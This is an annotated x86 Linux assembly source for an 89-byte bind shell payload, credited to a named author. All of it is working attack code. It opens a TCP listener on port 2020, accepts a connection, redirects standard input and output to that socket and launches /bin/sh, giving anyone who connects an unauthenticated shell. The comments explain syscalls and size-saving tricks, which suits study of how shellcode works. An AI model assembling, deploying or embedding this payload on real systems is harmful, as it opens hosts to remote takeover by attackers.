; Title: Linux/x86 Bind Shell code - 89 bytes
; Author: Zsolt Agoston (agzsolt)
; Website: http://x86net.com

global _start

section .text

_start:

;create socket 
;in /usr/include/i386-linux-gnu/asm/unistd_32.h searching for socket gives back syscall 102 (#define __NR_socketcall 102), in hex it is 0x66
;int socket(int domain, int type, int protocol) ==> socket(AF_INET, SOCK_STREAM, 0) ==> socket(2,1,0)
;AF_INET = 2  ( /usr/include/i386-linux-gnu/bits/socket.h)
;SOCK_STREAM = 1 (/usr/include/i386-linux-gnu/bits/socket_type.h)
; eax=0x66, ebx=0x01, stack has the socket args: 2,1,0

push 0x66
pop eax			      ; move socket syscall to eax

xor ebx, ebx		  ; 0x00 in ebx
push ebx          ; push 0x00 to the stack
inc ebx			      ; put 0x1 to ebx

push ebx		      ; value 0x01 is pushed in to the stack (SOCK_STREAM=1)
push 0x02		      ; value 0x02 is pushed onto stack (AF_INET=2)
mov ecx, esp		  ; save the pointer to arguments in ecx
int 0x80

mov esi, eax		  ; the syscall returns the socket file descriptor to eax, we store it in esi register

;bind(sock_file_des, (struct sockaddr *) &sock_ad, sizeof(sock_ad));
;bind = 2 (/usr/include/linux/net.h)
; eax=0x66, ebx=0x02, stack: socketfd value from previous step, stack mem address starts at AF_INET, 0x10, 2, 2020, 0 [socketfd, struct pointer, address size(4x4), AF_INET, port, ip (zero here which means any address (0.0.0.0)]
; more simple form of stack: sock_file_des, mem addr for stuct, struck leght (16 bytes), the struck itself

cdq			          ; 0x00 in edx, ; this trick uses the cdq command, which extends the eax register into edx in case the SF flag is set
                  ; (negative value of eax), which is not the case so it zeros out edx, this way we can save an extra byte
push edx		      ; push 0x00 on to stack (INADDR_ANY)
push word 0xe407	; listen on port 2020 (2020 is 0x07E4 in hex, we need to use a reverse byte order, putting 0xE4 first, then 0x07)
push word 0x2		  ; AF_INET=2, TCP protocol 2
mov ecx, esp		  ; save the pointer to arguments in ecx

mov al, 0x66		  ; sys socket call
inc ebx   		    ; bind(2)
push 0x10		      ; push size of sock_ad (the address length, 8+8 sin_zero member) to the stack
push ecx		      ; struct pointer
push esi		      ; push previously saved socket file descriptor onto stack
mov ecx, esp		  ; save the pointer to args in ecx
int 0x80

; listen(sock_file_des, 0);
; int listen(int sockfd, int backlog);
; cat /usr/include/linux/net.h | grep listen
; listen=4
; eax=0x66, ebx=4, ecx=args in stack (sockfd, backlog)

mov al, 0x66		  ; sys socket call
mov bl, 0x4		    ; listen(4)
push edx		      ; push 0 onto stack (backlog=0)
push esi		      ; sockfd (sock_file_des )
mov ecx, esp		  ; save the pointer to args in ecx
int 0x80

;accept(sock_file_des, NULL, NULL)
;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;cat /usr/include/linux/net.h | grep accept
;accept=5
; eax=0x66, ebx=5, ecx=args in stack (sockfd, NULL, NULL)

mov al, 0x66		  ; sys socket call
inc ebx			      ; accept(5)
push edx		      ; null value socklen_t *addrlen
push edx		      ; null value sockaddr *addr
push esi		      ; sockfd (sock_file_des )
mov ecx, esp		  ; save the pointer to args in ecx
int 0x80

;redirect stdin, stdout, stderr
;int dup2(int oldfd, int newfd);
;dup2(clientfd, 0); // stdin
;dup2(clientfd, 1); // stdout
;dup2(clientfd, 2); // stderr
; eax=0x3f, ebx=clientfd, ecx= (with the loop, it's 2-1-0 to redirect all 3 file descriptors)

mov ebx, eax		  ; move clientfd to ebx
push 0x02
pop ecx			      ; counter to loop 3 times (executes on cl=0, exits loop when SF=1)

stdloop:

mov al, 0x3f		  ; sys call for dup2
int 0x80
dec ecx			      ; decrement the loop counter
jns stdloop		    ; loop as long sign flag is not set

;execute shell (here we use /bin/sh) using execve call
;int execve(const char *filename, char *const argv[], char *const envp[]);
;execve("//bin/sh",["//bin/sh"])
; eax=0x0b, ebx=(pointer to the kernel instruction), ecx=0, edx=0

mov al, 0x0b		  ; execve
push edx		      ; push null
push 0x68732f6e		; hs/n
push 0x69622f2f		; ib//
mov ebx,esp		    ; save pointer
xor ecx, ecx		  ; null out ecx
int 0x80
